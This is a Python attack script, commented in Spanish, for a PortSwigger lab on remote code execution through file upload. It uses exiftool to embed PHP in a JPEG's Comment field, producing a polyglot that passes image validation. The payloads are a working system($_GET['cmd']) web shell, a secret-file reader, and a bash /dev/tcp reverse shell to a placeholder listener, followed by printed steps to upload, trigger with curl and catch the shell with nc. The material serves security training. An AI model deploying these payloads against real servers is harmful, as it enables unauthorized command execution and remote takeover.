#!/usr/bin/env python3
"""
File Upload -> RCE via POLYGLOT WEB SHELL (exiftool + campo Comment)
===================================================================
Lab PortSwigger: "Remote code execution via polyglot web shell upload".

El servidor permite subir un avatar y VALIDA que sea una imagen de verdad
(comprueba el contenido con getimagesize/exif, no solo la extension). Por eso
un .php pelado no cuela. La tecnica: incrustar el codigo PHP DENTRO de los
metadatos de un JPEG legitimo, en el campo "Comment", usando exiftool. El
resultado es un POLYGLOT: el mismo fichero es JPEG valido Y PHP ejecutable.

  - Como imagen  -> conserva la cabecera/estructura JPEG, pasa la validacion.
  - Como .php    -> si el servidor lo interpreta como PHP, ejecuta el Comment.

exiftool aqui es la herramienta que USA EL ATACANTE para construir el polyglot
(escribe el metadato Comment). No confundir con el exiftool del servidor, que
solo lee metadatos.

Flujo del lab una vez generado el polyglot:
  1. Login como wiener:peter.
  2. Subir el polyglot por el formulario de avatar, nombrandolo con .php.
  3. GET /files/avatars/<fichero>.php  -> se ejecuta el PHP del Comment.
  4. Enviar el secreto (o usar la reverse shell) segun el payload elegido.

exiftool va INCLUIDO en esta misma carpeta (exiftool.exe + exiftool_files/),
asi que el script lo llama localmente y no necesitas instalarlo en el PATH.

Uso:
    python build_polyglot.py                 # usa la imagen base embebida
    python build_polyglot.py mi_foto.jpg     # usa tu propia imagen base

Para cambiar lo que ejecuta el shell: edita SOLO la variable PAYLOAD abajo.
"""
import base64
import os
import shutil
import subprocess
import sys

# --- CONFIGURACION ---------------------------------------------------------
HERE = os.path.dirname(os.path.abspath(__file__))
BASE_IMG = sys.argv[1] if len(sys.argv) > 1 else "base.jpg"  # imagen base (JPEG)
OUT = "exploit.php"          # polyglot de salida (.php para el upload)
EXIF_FIELD = "Comment"       # campo de metadatos donde va el PHP

# --- PAYLOAD (esto es lo unico que sueles cambiar) -------------------------
# Elige UNO. Todos son PHP validos que iran dentro del Comment.
# El payload es facilmente sustituible: cambia esta variable y reconstruye.

# (A) Web shell generica: ejecuta comandos arbitrarios via ?cmd=...
PAYLOAD = '<?php echo system($_GET["cmd"]); ?>'

# (B) Lector directo del secreto del lab (solucion "oficial" de PortSwigger):
# PAYLOAD = '<?php echo file_get_contents("/home/carlos/secret"); ?>'

# (C) REVERSE SHELL: cambia IP/PORT por los de tu listener ( nc -lvnp 4444 ).
# RS_IP, RS_PORT = "10.10.10.10", "4444"
# PAYLOAD = ("<?php exec(\"/bin/bash -c 'bash -i >& "
#            f"/dev/tcp/{RS_IP}/{RS_PORT} 0>&1'\"); ?>")

# --- exiftool local --------------------------------------------------------
# En Windows usamos el exiftool.exe que va junto a este script; en otros SO,
# el exiftool del PATH. exiftool_files/ debe estar al lado del .exe.
EXIFTOOL = os.path.join(HERE, "exiftool.exe")
if not os.path.isfile(EXIFTOOL):
    EXIFTOOL = shutil.which("exiftool")

# JPEG 1x1 minimo y valido (base64) para generar una imagen base sin depender
# de tener una a mano. Solo se usa si BASE_IMG no existe.
EMBEDDED_JPEG_B64 = (
    "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRof"
    "Hh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwh"
    "MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAAR"
    "CAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAA"
    "AgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkK"
    "FhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWG"
    "h4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl"
    "5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREA"
    "AgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYk"
    "NOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOE"
    "hYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk"
    "5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD3+iiigD//2Q=="
)


def run_exiftool(*args):
    """Invoca exiftool con -q; devuelve stdout. Aborta si falla."""
    r = subprocess.run([EXIFTOOL, *args], capture_output=True, text=True)
    if r.returncode != 0:
        sys.exit(f"[!] exiftool fallo: {r.stderr.strip() or r.stdout.strip()}")
    return r.stdout


def main():
    if not EXIFTOOL:
        sys.exit("[!] No encuentro exiftool.exe en esta carpeta ni exiftool en el PATH.")

    # 1) Asegurar imagen base.
    if not os.path.isfile(BASE_IMG):
        print(f"[1] No existe '{BASE_IMG}'. Genero un JPEG base embebido (1x1).")
        with open(BASE_IMG, "wb") as f:
            f.write(base64.b64decode(EMBEDDED_JPEG_B64))
    else:
        print(f"[1] Uso imagen base existente: '{BASE_IMG}'")

    # 2) Construir el polyglot: copiar la imagen y escribir el PHP en Comment.
    shutil.copyfile(BASE_IMG, OUT)
    print(f"[2] Inyectando PHP en el campo {EXIF_FIELD} con exiftool")
    run_exiftool("-overwrite_original", f"-{EXIF_FIELD}={PAYLOAD}", OUT)
    print(f"    payload -> {PAYLOAD}")

    # 3) Verificar.
    print(f"[3] Verificacion (el Comment debe contener tu PHP):")
    print("   ", run_exiftool(f"-{EXIF_FIELD}", OUT).strip())
    print("    tipo real:", run_exiftool("-FileType", "-MIMEType", OUT).strip().replace("\n", " | "))

    # 4) Siguientes pasos.
    print(f"""
[OK] Polyglot generado: {OUT}  (JPEG valido + PHP en el metadato {EXIF_FIELD})

Siguientes pasos en el lab:
  1) Login wiener:peter y sube '{OUT}' por el formulario de avatar
     (subelo con nombre .php; el contenido sigue siendo una imagen valida).
  2) Dispara la ejecucion:
        curl 'https://TU-LAB.web-security-academy.net/files/avatars/{OUT}?cmd=id'
     (para el payload B, un simple GET al fichero devuelve el secreto).
  3) Reverse shell (payload C): abre tu listener  ->  nc -lvnp 4444
     y luego pide el fichero para lanzar la conexion de vuelta.

Para cambiar lo que hace el shell: edita la variable PAYLOAD arriba y reejecuta.""")


if __name__ == "__main__":
    main()
